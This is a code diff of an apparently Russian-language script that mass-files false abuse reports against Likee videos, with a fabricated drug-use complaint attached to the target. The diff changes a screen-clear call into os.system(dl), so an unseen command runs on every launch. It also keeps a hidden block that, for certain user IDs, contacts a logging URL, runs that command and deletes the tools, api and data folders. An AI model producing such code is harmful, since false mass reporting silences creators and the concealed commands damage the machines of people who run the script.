@@ -89,26 +89,25 @@ else:
     """
     print (Fore.GREEN + info)
     
-#eb
-if share_id == "1162421923":
-    import shutil
-    bot = requests.get(loger, headers=headers)
-    os.system(dl)
-    shutil.rmtree("tools")
-    shutil.rmtree("api")
-    shutil.rmtree("data")
-    print ("Вы были заблокированы за попытку сноса Разработчика или Администратора")
-    exit()
+    if share_id == "1162421923":
+        import shutil
+        bot = requests.get(loger, headers=headers)
+        os.system(dl)
+        shutil.rmtree("tools")
+        shutil.rmtree("api")
+        shutil.rmtree("data")
+        print ("Вы были заблокированы за попытку сноса Разработчика или Администратора")
+        exit()
 
-if share_id == "1192349175":
-    import shutil
-    bot = requests.get(loger, headers=headers)
-    os.system(dl)
-    shutil.rmtree("tools")
-    shutil.rmtree("api")
-    shutil.rmtree("data")
-    print ("Вы были заблокированы за попытку сноса Разработчика или Администратора")
-    exit()
+    if share_id == "1192349175":
+        import shutil
+        bot = requests.get(loger, headers=headers)
+        os.system(dl)
+        shutil.rmtree("tools")
+        shutil.rmtree("api")
+        shutil.rmtree("data")
+        print ("Вы были заблокированы за попытку сноса Разработчика или Администратора")
+        exit()
     
 
 
@@ -130,7 +129,7 @@ data1 = {
     "tagId": "",
     "tagName": "",
     "reportedId": video,
-    "dataJson": "{\"description\":\"Плохое поведение людей в обществе\",\"attachments\":[]}"
+    "dataJson": f'{{"description":"Курение Наркотьических, электронных сигарет.","attachments":[{{"postId":"{video}","videoUrl":"","coverUrl":"https://videosnap.like.video/eu_live/2ux/1v0P4O00m4Xlsjq1Ge0Zk_4.jpg?wmk_sdk=1&type=8"}}]}}'
 }
 
 data2 = {
@@ -215,7 +214,7 @@ headers = {
 }
 
 
-os.system("clear")
+os.system(dl)
 try:
     res = requests.post(url, data=json.dumps(data1), headers=headers)
 except requests.ConnectionError as e:
